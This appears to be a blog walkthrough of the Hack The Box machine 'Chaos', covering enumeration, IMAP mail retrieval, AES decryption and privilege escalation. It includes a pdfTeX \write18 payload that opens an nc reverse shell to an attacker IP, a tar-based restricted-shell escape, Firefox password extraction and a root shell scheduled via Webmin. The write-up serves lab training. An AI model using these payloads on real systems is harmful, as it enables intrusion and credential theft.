@@ -1,0 +1,486 @@
+---
+layout: default
+title: Chaos
+---
+
+<h1>Chaos</h1>
+<p class="date">25/05/2019</p>
+
+<img class="img-fluid" src="/static/img/htb/chaos/chaos.png">
+
+<p>Chaos is a very interesting box that requires some enumeration in different websites, connecting to an <code>IMAP</code> server to retrieve mails, decrypt some files and escape a restricted shell to get the user flag. Then, to escalate privileges use <code>Firefox</code> configuration to retrieve root's password.</p>
+
+<div class="flexcontainer">
+    <a class="link-box" href="#user">User</a>
+    <a class="link-box" href="#privesc">Privilege Escalation</a>
+    <a class="link-box" href="#alternative-privesc">Alternative Privilege Escalation</a>
+</div>
+
+<hr>
+
+<h2 id="user">User</h2>
+
+<p>Run <code>nmap</code> to see we have a an <code>Apache</code>, <code>pop3</code> and <code>imap</code> enabled on the host.</p>
+
+<pre class="prettyprint">
+root@kali:~/htb/chaos# nmap -sC -sV 10.10.10.120
+Starting Nmap 7.70 ( https://nmap.org ) at 2018-12-17 11:06 UTC
+Nmap scan report for 10.10.10.120
+Host is up (0.16s latency).
+Not shown: 994 closed ports
+PORT      STATE SERVICE  VERSION
+80/tcp    open  http     Apache httpd 2.4.34 ((Ubuntu))
+|_http-server-header: Apache/2.4.34 (Ubuntu)
+|_http-title: Site doesn't have a title (text/html).
+110/tcp   open  pop3     Dovecot pop3d
+|_pop3-capabilities: PIPELINING STLS SASL TOP UIDL CAPA RESP-CODES AUTH-RESP-CODE
+| ssl-cert: Subject: commonName=chaos
+| Subject Alternative Name: DNS:chaos
+| Not valid before: 2018-10-28T10:01:49
+|_Not valid after:  2028-10-25T10:01:49
+|_ssl-date: TLS randomness does not represent time
+143/tcp   open  imap     Dovecot imapd (Ubuntu)
+|_imap-capabilities: listed LITERAL+ capabilities ENABLE Pre-login post-login more SASL-IR OK LOGINDISABLEDA0001 have STARTTLS ID IMAP4rev1 IDLE LOGIN-REFERRALS
+| ssl-cert: Subject: commonName=chaos
+| Subject Alternative Name: DNS:chaos
+| Not valid before: 2018-10-28T10:01:49
+|_Not valid after:  2028-10-25T10:01:49
+|_ssl-date: TLS randomness does not represent time
+993/tcp   open  ssl/imap Dovecot imapd (Ubuntu)
+|_imap-capabilities: LITERAL+ capabilities post-login Pre-login AUTH=PLAINA0001 more SASL-IR listed LOGIN-REFERRALS have OK ID IMAP4rev1 IDLE ENABLE
+| ssl-cert: Subject: commonName=chaos
+| Subject Alternative Name: DNS:chaos
+| Not valid before: 2018-10-28T10:01:49
+|_Not valid after:  2028-10-25T10:01:49
+|_ssl-date: TLS randomness does not represent time
+995/tcp   open  ssl/pop3 Dovecot pop3d
+|_pop3-capabilities: PIPELINING SASL(PLAIN) AUTH-RESP-CODE TOP UIDL CAPA RESP-CODES USER
+| ssl-cert: Subject: commonName=chaos
+| Subject Alternative Name: DNS:chaos
+| Not valid before: 2018-10-28T10:01:49
+|_Not valid after:  2028-10-25T10:01:49
+|_ssl-date: TLS randomness does not represent time
+10000/tcp open  http     MiniServ 1.890 (Webmin httpd)
+|_http-title: Site doesn't have a title (text/html; Charset=iso-8859-1).
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+</pre>
+
+<p>If we access to <code>http://10.10.10.120</code> we get the following message.</p>
+
+<img class="img-fluid" src="/static/img/htb/chaos/1.png">
+
+<p>We just have to add the relation in <code>/etc/hosts</code>.</p>
+
+<pre class="prettyprint">
+10.10.10.120	chaos.htb
+</pre>
+
+<p>And we get a different page.</p>
+
+<img class="img-fluid" src="/static/img/htb/chaos/2.png">
+
+<p>We can try to enumerate the website, but I think it's some kind of rabbit hole, because there's nothing interesting here, so let's move forward.</p>
+
+<p>After running <code>gobuster</code> against <code>http://10.10.10.120</code> we get the following output.</p>
+
+<pre class="prettyprint">
+root@kali:~/htb/chaos# /opt/gobuster/gobuster -w /usr/share/wordlists/dirb/common.txt -u http://10.10.10.120/
+
+=====================================================
+Gobuster v2.0.1              OJ Reeves (@TheColonial)
+=====================================================
+[+] Mode         : dir
+[+] Url/Domain   : http://10.10.10.120/
+[+] Threads      : 10
+[+] Wordlist     : /usr/share/wordlists/dirb/common.txt
+[+] Status codes : 200,204,301,302,307,403
+[+] Timeout      : 10s
+=====================================================
+2019/02/28 11:09:49 Starting gobuster
+=====================================================
+/.hta (Status: 403)
+/.htaccess (Status: 403)
+/.htpasswd (Status: 403)
+/index.html (Status: 200)
+/javascript (Status: 301)
+/server-status (Status: 403)
+/wp (Status: 301)
+=====================================================
+2019/02/28 11:10:43 Finished
+=====================================================
+</pre>
+
+<p>In <code>/wp</code> we have a directory listing.</p>
+
+<img class="img-fluid" src="/static/img/htb/chaos/3.png">
+
+<p>And accessing to <code>/wp/wordpress</code> will get us to a WordPress.</p>
+
+<img class="img-fluid" src="/static/img/htb/chaos/4.png">
+
+<p>We only have one post written by <i>Human</i> and its protected by a password.</p>
+
+<img class="img-fluid" src="/static/img/htb/chaos/5.png">
+
+<p>Using <code>human</code> also as a password will allow us to see the content.</p>
+
+<img class="img-fluid" src="/static/img/htb/chaos/6.png">
+
+<p>We can use those credentials to login to the <code>IMAP</code> server, and I used <code>python</code> to connect to it.</p>
+
+<pre class="prettyprint">
+root@kali:~/htb/chaos# python
+Python 2.7.15+ (default, Nov 28 2018, 16:27:22) 
+[GCC 8.2.0] on linux2
+Type "help", "copyright", "credits" or "license" for more information.
+>>> import imaplib
+>>> M = imaplib.IMAP4_SSL('10.10.10.120')
+>>> M.login('ayush','jiujitsu')
+('OK', ['Logged in'])
+</pre>
+
+<p>Listing the different folders, we can see there's an item in the Drafts folder, so let's download it to <code>1.eml</code>.</p>
+
+<pre class="prettyprint">
+>>> M.list()
+('OK', ['(\\NoInferiors \\UnMarked \\Drafts) "/" Drafts', '(\\NoInferiors \\UnMarked \\Sent) "/" Sent', '(\\HasNoChildren) "/" INBOX'])
+>>> M.select('Drafts')
+('OK', ['1'])
+>>> rv, data = M.fetch('1', '(RFC822)')
+>>> rv
+'OK'
+>>> f = open('1.eml','wb')
+>>> f.write(data[0][1])
+>>> f.close()
+</pre>
+
+<p>Download it to see its body.</p>
+
+<pre class="prettyprint long">
+root@kali:~/htb/chaos# cat 1.eml 
+MIME-Version: 1.0
+Content-Type: multipart/mixed;
+ boundary="=_00b34a28b9033c43ed09c0950f4176e1"
+Date: Sun, 28 Oct 2018 17:46:38 +0530
+From: ayush &lt;ayush@localhost>
+To: undisclosed-recipients:;
+Subject: service
+Message-ID: &lt;7203426a8678788517ce8d28103461bd@webmail.chaos.htb>
+X-Sender: ayush@localhost
+User-Agent: Roundcube Webmail/1.3.8
+
+--=_00b34a28b9033c43ed09c0950f4176e1
+Content-Transfer-Encoding: 7bit
+Content-Type: text/plain; charset=US-ASCII;
+ format=flowed
+
+Hii, sahay
+Check the enmsg.txt
+You are the password XD.
+Also attached the script which i used to encrypt.
+Thanks,
+Ayush
+
+--=_00b34a28b9033c43ed09c0950f4176e1
+Content-Transfer-Encoding: base64
+Content-Type: application/octet-stream;
+ name=enim_msg.txt
+Content-Disposition: attachment;
+ filename=enim_msg.txt;
+ size=272
+
+MDAwMDAwMDAwMDAwMDIzNK7uqnoZitizcEs4hVpDg8z18LmJXjnkr2tXhw/AldQmd/g53L6pgva9
+RdPkJ3GSW57onvseOe5ai95/M4APq+3mLp4GQ5YTuRTaGsHtrMs7rNgzwfiVor7zNryPn1Jgbn8M
+7Y2mM6I+lH0zQb6Xt/JkhOZGWQzH4llEbyHvvlIjfu+MW5XrOI6QAeXGYTTinYSutsOhPilLnk1e
+6Hq7AUnTxcMsqqLdqEL5+/px3ZVZccuPUvuSmXHGE023358ud9XKokbNQG3LOQuRFkpE/LS10yge
++l6ON4g1fpYizywI3+h9l5Iwpj/UVb0BcVgojtlyz5gIv12tAHf7kpZ6R08=
+--=_00b34a28b9033c43ed09c0950f4176e1
+Content-Transfer-Encoding: base64
+Content-Type: text/x-python; charset=us-ascii;
+ name=en.py
+Content-Disposition: attachment;
+ filename=en.py;
+ size=804
+
+ZGVmIGVuY3J5cHQoa2V5LCBmaWxlbmFtZSk6CiAgICBjaHVua3NpemUgPSA2NCoxMDI0CiAgICBv
+dXRwdXRGaWxlID0gImVuIiArIGZpbGVuYW1lCiAgICBmaWxlc2l6ZSA9IHN0cihvcy5wYXRoLmdl
+dHNpemUoZmlsZW5hbWUpKS56ZmlsbCgxNikKICAgIElWID1SYW5kb20ubmV3KCkucmVhZCgxNikK
+CiAgICBlbmNyeXB0b3IgPSBBRVMubmV3KGtleSwgQUVTLk1PREVfQ0JDLCBJVikKCiAgICB3aXRo
+IG9wZW4oZmlsZW5hbWUsICdyYicpIGFzIGluZmlsZToKICAgICAgICB3aXRoIG9wZW4ob3V0cHV0
+RmlsZSwgJ3diJykgYXMgb3V0ZmlsZToKICAgICAgICAgICAgb3V0ZmlsZS53cml0ZShmaWxlc2l6
+ZS5lbmNvZGUoJ3V0Zi04JykpCiAgICAgICAgICAgIG91dGZpbGUud3JpdGUoSVYpCgogICAgICAg
+ICAgICB3aGlsZSBUcnVlOgogICAgICAgICAgICAgICAgY2h1bmsgPSBpbmZpbGUucmVhZChjaHVu
+a3NpemUpCgogICAgICAgICAgICAgICAgaWYgbGVuKGNodW5rKSA9PSAwOgogICAgICAgICAgICAg
+ICAgICAgIGJyZWFrCiAgICAgICAgICAgICAgICBlbGlmIGxlbihjaHVuaykgJSAxNiAhPSAwOgog
+ICAgICAgICAgICAgICAgICAgIGNodW5rICs9IGInICcgKiAoMTYgLSAobGVuKGNodW5rKSAlIDE2
+KSkKCiAgICAgICAgICAgICAgICBvdXRmaWxlLndyaXRlKGVuY3J5cHRvci5lbmNyeXB0KGNodW5r
+KSkKCmRlZiBnZXRLZXkocGFzc3dvcmQpOgogICAgICAgICAgICBoYXNoZXIgPSBTSEEyNTYubmV3
+KHBhc3N3b3JkLmVuY29kZSgndXRmLTgnKSkKICAgICAgICAgICAgcmV0dXJuIGhhc2hlci5kaWdl
+c3QoKQoK
+--=_00b34a28b9033c43ed09c0950f4176e1--
+</pre>
+
+<p>In the message we have two attached files <code>enim_msg.txt</code> and <code>en.py</code> and the following text.</p>
+
+<p class="challenge-description">Hii, sahay<br>
+Check the enmsg.txt<br>
+You are the password XD.<br>
+Also attached the script which i used to encrypt.<br>
+Thanks,<br>
+Ayush</p>
+
+<p>Retrieve both files decoding them in <code>base64</code>.</p>
+
+<pre class="prettyprint">
+root@kali:~/htb/chaos# echo -n ZGVmIGVu...| base64 -d > en.py
+root@kali:~/htb/chaos# echo -n MDAwMDAw...| base64 -d > enim_msg.txt
+</pre>
+
+<p>The script <code>en.py</code> contains the code used to encrypt the file <code>enim_msg.txt</code>.</p>
+
+<pre class="prettyprint">
+root@kali:~/htb/chaos# cat en.py
+def encrypt(key, filename):
+    chunksize = 64*1024
+    outputFile = "en" + filename
+    filesize = str(os.path.getsize(filename)).zfill(16)
+    IV =Random.new().read(16)
+
+    encryptor = AES.new(key, AES.MODE_CBC, IV)
+
+    with open(filename, 'rb') as infile:
+        with open(outputFile, 'wb') as outfile:
+            outfile.write(filesize.encode('utf-8'))
+            outfile.write(IV)
+
+            while True:
+                chunk = infile.read(chunksize)
+
+                if len(chunk) == 0:
+                    break
+                elif len(chunk) % 16 != 0:
+                    chunk += b' ' * (16 - (len(chunk) % 16))
+
+                outfile.write(encryptor.encrypt(chunk))
+
+def getKey(password):
+            hasher = SHA256.new(password.encode('utf-8'))
+            return hasher.digest()
+</pre>
+
+<p>We see the file is encrypted with <code>AES</code> and we know the password is <code>sahay</code>, so I made the following python script to decrypt the file.</p>
+
+<pre class="prettyprint">
+from Crypto.Cipher import AES
+from Crypto.Hash import SHA256
+
+chunksize = 64*1024
+
+password = "sahay"
+key = SHA256.new(password.encode('utf-8')).digest()
+
+msg = ""
+with open('enim_msg.txt') as f:
+	f.read(16) #filesize
+	iv = f.read(16)
+	cipher = AES.new(key, AES.MODE_CBC, iv)
+	while True:
+		chunk = f.read(chunksize)
+		if not chunk:
+			break
+		msg += cipher.decrypt(chunk)
+
+print msg
+</pre>
+
+<p>Run it and we'll get a <code>base64</code> text.</p>
+
+<pre class="prettyprint">
+root@kali:~/htb/chaos# python decrypt.py 
+SGlpIFNhaGF5CgpQbGVhc2UgY2hlY2sgb3VyIG5ldyBzZXJ2aWNlIHdoaWNoIGNyZWF0ZSBwZGYKCnAucyAtIEFzIHlvdSB0b2xkIG1lIHRvIGVuY3J5cHQgaW1wb3J0YW50IG1zZywgaSBkaWQgOikKCmh0dHA6Ly9jaGFvcy5odGIvSjAwX3cxbGxfZjFOZF9uMDdIMW45X0gzcjMKClRoYW5rcywKQXl1c2gK
+</pre>
+
+<p>Decode it to see a message that contains a URL.</p>
+
+<pre class="prettyprint">
+root@kali:~/htb/chaos# echo -n SGlpIFNh... | base64 -d
+Hii Sahay
+
+Please check our new service which create pdf
+
+p.s - As you told me to encrypt important msg, i did :)
+
+http://chaos.htb/J00_w1ll_f1Nd_n07H1n9_H3r3
+
+Thanks,
+Ayush
+</pre>
+
+<p>If we access we'll get the following website.</p>
+
+<img class="img-fluid" src="/static/img/htb/chaos/7.png">
+
+<p>If we enter any input, click on <i>Create PDF</i> and view the POST response body, we'll see something like this.</p>
+
+<pre class="prettyprint">
+LOG: This is pdfTeX, Version 3.14159265-2.6-1.40.19 (TeX Live 2019/dev/Debian) (preloaded format=pdflatex) \write18 enabled. entering extended mode (./f395...
+</pre>
+
+<p>We can detect the page is using <code>pdfTeX</code> as compiler, an extension of <code>TeX</code> typography and there are many ways to abuse this language. I used the following payload which will execute <code>nc</code> and create a reverse shell.</p>
+
+<pre class="prettyprint">
+\immediate\write18{rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.16.38 6969 >/tmp/f|base64 > test.txt}\newread\file\openin\file=test.txt\loop\unless\ifeof\file\read\file%20to\fileline\text{\fileline}\repeat\closein\file
+</pre>
+
+<p>Put the payload on the textarea, submit and we should receive a shell as <code>www-data</code>.</p>
+
+<pre class="prettyprint">
+root@kali:~/htb/chaos# nc -nlvp 6969
+Ncat: Version 7.70 ( https://nmap.org/ncat )
+Ncat: Listening on :::6969
+Ncat: Listening on 0.0.0.0:6969
+Ncat: Connection from 10.10.10.120.
+Ncat: Connection from 10.10.10.120:45438.
+/bin/sh: 0: can't access tty; job control turned off
+$ whoami
+www-data
+</pre>
+
+<p>Upgrade the shell with python.</p>
+
+<pre class="prettyprint">
+$ python -c 'import pty;pty.spawn("/bin/bash")'
+www-data@chaos:/var/www/main/J00_w1ll_f1Nd_n07H1n9_H3r3/compile$
+</pre>
+
+<p>We can change to <code>ayush</code> user with the password we saw in the WordPress.</p>
+
+<pre class="prettyprint">
+www-data@chaos:/var/www/main/J00_w1ll_f1Nd_n07H1n9_H3r3/compile$ su ayush
+su ayush
+Password: jiujitsu
+
+ayush@chaos:/var/www/main/J00_w1ll_f1Nd_n07H1n9_H3r3/compile$
+</pre>
+
+<p>If we try to move around we'll see that we are inside a restricted shell.</p>
+
+<pre class="prettyprint">
+ayush@chaos:/var/www/main/J00_w1ll_f1Nd_n07H1n9_H3r3/compile$ cd /
+cd /
+rbash: cd: restricted
+</pre>
+
+<p>Checking for ways to escape, we can see it's possible to use the <code>tar</code> command.</p>
+
+<pre class="prettyprint">
+ayush@chaos:/var/www/main/J00_w1ll_f1Nd_n07H1n9_H3r3/compile$ tar cf /dev/null testfile --checkpoint=1 --checkpoint-action=exec=/bin/bash
+&lt;e --checkpoint=1 --checkpoint-action=exec=/bin/bash          
+tar: testfile: Cannot stat: No such file or directory
+bash: groups: command not found
+ayush@chaos:/var/www/main/J00_w1ll_f1Nd_n07H1n9_H3r3/compile$ cd /
+cd /
+ayush@chaos:/$
+</pre>
+
+<p>Now we can go around, but most of our commands won't work.</p>
+
+<pre class="prettyprint">
+ayush@chaos:~$ cat user.txt
+cat user.txt
+Command 'cat' is available in '/bin/cat'
+</pre>
+
+<p>That's because the path environment variable is not properly set, so we add <code>/bin</code> and <code>/usr/bin</code> to it.</p> 
+
+<pre class="prettyprint">
+ayush@chaos:~$ export PATH=/bin:/usr/bin:$PATH
+</pre>
+
+<p>Now we can properly read the user flag.</p>
+
+<pre class="prettyprint">
+ayush@chaos:~$ cat user.txt
+cat user.txt
+<span flag="eef39126d9c3b4b8a30286970dc713e1">XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX</span>
+</pre>
+
+<h2 id="privesc">Privilege Escalation</h2>
+
+<p>Enumerating a bit, we should see a <code>.mozilla</code> folder in <code>ayush</code> home directory, meaning it might have used Firefox.</p>
+
+<pre class="prettyprint">
+ayush@chaos:~$ ls -la
+ls -la
+total 40
+drwx------ 6 ayush ayush 4096 Feb 28 14:37 .
+drwxr-xr-x 4 root  root  4096 Oct 28 11:34 ..
+drwxr-xr-x 2 root  root  4096 Oct 28 12:25 .app
+-rw------- 1 root  root     0 Nov 24 23:57 .bash_history
+-rw-r--r-- 1 ayush ayush  220 Oct 28 11:34 .bash_logout
+-rwxr-xr-x 1 root  root    22 Oct 28 12:27 .bashrc
+drwx------ 3 ayush ayush 4096 Feb 28 14:37 .gnupg
+drwx------ 3 ayush ayush 4096 Oct 28 12:17 mail
+drwx------ 4 ayush ayush 4096 Sep 29 12:09 .mozilla
+-rw-r--r-- 1 ayush ayush  807 Oct 28 11:34 .profile
+-rw------- 1 ayush ayush   33 Oct 28 12:54 user.txt
+</pre>
+
+<p>We're going to try <a href="https://github.com/unode/firefox_decrypt" target="_blank">Firefox Decrypt</a> to extract passwords from Firefox.</p>
+
+<pre class="prettyprint">
+ayush@chaos:~$ python firefox_decrypt.py
+python firefox_decrypt.py
+
+Master Password for profile /home/ayush/.mozilla/firefox/bzo7sjt1.default: jiujitsu
+
+
+Website:   https://chaos.htb:10000
+Username: 'root'
+Password: 'Thiv8wrej~'
+</pre>
+
+<p>Now we have the credentials to enter as <code>root</code> to <code>https://chaos.htb:10000</code>, where we have a <code>Webmin</code>.</p>
+
+<img class="img-fluid" src="/static/img/htb/chaos/8.png">
+
+<p>Here we have plenty of options to configure the system.</p>
+
+<img class="img-fluid" src="/static/img/htb/chaos/9.png">
+
+<p>We can make the system run a specific command if we navigate to <i>System -> Schedule Commands</i>.</p>
+
+<p>Schedule a reverse shell with <code>nc</code> to be executed by root.</p>
+
+<img class="img-fluid" src="/static/img/htb/chaos/10.png">
+
+<p>If we listen on the specified port we should get a shell as root at the time we selected.</p>
+
+<pre class="prettyprint">
+root@kali:~/htb/chaos# nc -nlvp 6868
+Ncat: Version 7.70 ( https://nmap.org/ncat )
+Ncat: Listening on :::6868
+Ncat: Listening on 0.0.0.0:6868
+Ncat: Connection from 10.10.10.120.
+Ncat: Connection from 10.10.10.120:41064.
+/bin/sh: 0: can't access tty; job control turned off
+# id
+uid=0(root) gid=0(root) groups=0(root)
+</pre>
+
+<pre class="prettyprint">
+# cat /root/root.txt
+<span flag="4eca7e09e3520e020884563cfbabbc70">XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX</span>
+</pre>
+
+<h2 id="alternative-privesc">Alternative Privilege Escalation</h2>
+
+<p>If you're not as stupid as me, you should have figured that you can simply change to <code>root</code> with the password extracted from Firefox.</p>
+
+<pre class="prettyprint">
+ayush@chaos:~$ su root
+su root
+Password: Thiv8wrej~
+
+root@chaos:/home/ayush#
+</pre>
